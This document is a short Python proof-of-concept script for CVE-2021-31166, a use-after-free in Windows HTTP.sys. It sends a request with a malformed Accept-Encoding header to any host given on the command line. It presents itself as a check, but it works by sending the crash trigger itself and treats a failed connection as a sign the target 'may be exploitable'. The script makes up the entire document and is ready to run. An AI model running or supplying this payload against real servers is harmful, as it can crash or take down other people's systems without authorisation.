# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser(description='PoC for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('target', help='Target domain or IP (e.g., example.com)')
    args = parser.parse_args()

    target = args.target

    try:
        response = requests.get(f'http://{target}/', headers={
            'Accept-Encoding': 'doar-e, ftw, imo, ,',
        }, timeout=5)

        if response.status_code == 200:
            print('[+] Target responded normally. Site is likely **not exploitable**.')
        else:
            print(f'[?] Unexpected status code: {response.status_code}. Site may be **exploitable**.')

    except requests.exceptions.RequestException as e:
        print(f'[!] Exception occurred: {e}')
        print('[+] Site may be **exploitable**, or it crashed due to malformed request.')

main()

